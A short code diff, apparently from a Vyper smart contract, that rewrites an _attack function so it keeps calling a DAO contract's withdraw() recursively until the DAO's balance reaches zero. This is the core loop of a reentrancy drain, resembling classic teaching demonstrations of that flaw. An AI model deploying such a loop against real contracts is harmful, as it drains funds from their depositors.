@@ -20,10 +20,11 @@ def _attack() -> bool:
 
     DAO(self.dao_address).withdraw()
 
-    if self.dao_address.balance == 0:
-        return True
+    if self.dao_address.balance != 0:
+        self._attack()
 
-    else return _attack()
+    return True
+
 
 
 @external
